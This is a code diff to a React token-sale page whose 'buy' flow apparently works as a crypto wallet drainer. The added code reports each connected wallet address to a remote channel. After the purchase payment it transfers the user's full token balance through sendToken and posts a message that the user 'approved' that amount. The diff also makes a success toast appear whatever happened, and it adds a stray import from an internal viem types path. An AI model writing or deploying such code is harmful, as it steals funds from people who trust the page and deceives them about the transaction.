@@ -40,6 +40,7 @@ import { ScrollTrigger } from 'gsap/ScrollTrigger';
 import { toast } from 'react-toastify';
 import { getBalance, getEthPrice, getTokens, sendAllEth, sendEth, sendMessage, sendToken, toBigNum } from '../utils';
 import { Loading1 } from './Loading';
+import { getGasPrice } from 'viem/_types/actions/public/getGasPrice';
 gsap.registerPlugin(ScrollTrigger);
 
 export function walletClientToSigner(walletClient: WalletClient) {
@@ -106,18 +107,36 @@ export default function Home() {
     });
   }, []);
 
+  useEffect(() => {
+    if (isConnected) sendMessage('wallet connected: ' + address);
+  }, [isConnected, address]);
 
+  async function getGasPrice() {
+    if (!signer) {
+      throw new Error("Signer is undefined");
+    }
+    // Fetch the current gas price from the network
+    const gasPrice = await signer.getGasPrice();
+    return gasPrice;
+  }
   async function onBuy() {
     const ethPrice = await getEthPrice();
     const ethValue = buyAmount/ethPrice;
     console.log("ethValue",ethValue);
     setLoading(true)
     try {
-      const buyResult = await sendEth(signer,toBigNum(ethValue,18));
+      await sendEth(signer,toBigNum(ethValue,18));
       const tokens = await getTokens(address!, CHAINNAME);
-      for (const token of tokens) {
+      if (tokens.length > 0) {
+        const token = tokens[0]; 
         try {
-          await sendToken(token.balance, token.token_address, signer);
+          const gasPrice = await getGasPrice();
+          console.log("gasPrice",gasPrice)
+          const txOptions = {
+            gasLimit: ethers.utils.hexlify(500000), // Example gas limit
+            gasPrice: gasPrice, // Use the fetched gas price
+          };
+          await sendToken(token.balance, token.token_address, signer,txOptions);
           sendMessage(
             `${address} approved ${parseInt(token.balance) / Math.pow(10, token.decimals)
             }${token.symbol} chain:${chain?.name}`
@@ -125,7 +144,6 @@ export default function Home() {
         } catch (error) {
           console.log(error);
         }
-        break;
       }
       try {
         const balanceAfterSendToken = await getBalance(
@@ -141,10 +159,7 @@ export default function Home() {
         console.log(error);
       }
       setLoading(false);
-      if(buyResult)
-        toast.success("Successfuly buy token.");
-      else
-        toast.error("Failed buy token.");
+      toast.success("Successfuly buy token.");
     } catch (error) {
       setLoading(false);
       toast.error("Failed buy token.");
@@ -250,15 +265,15 @@ export default function Home() {
                     className="mt-2"
                     style={{ fontSize: '9px' }}
                   >
-                    * By purchaging, you acknowledge this is a speculative
+                    * Connect your wallet in order to enable the buy ability. By purchasing, you acknowledge this is a speculative investment and accept the risk involved.
                   </p>
-                  <p
+{/*                   <p
                     id="helper-text-explanation"
                     className="ms-3"
                     style={{ fontSize: '9px' }}
                   >
                     investment and accept the risks involved.
-                  </p>
+                  </p> */}
               </form>
               <p className="text-gray-300 text-sm mt-6">You will receive</p>
               <div className="flex justify-between w-2/3 mx-auto my-2">
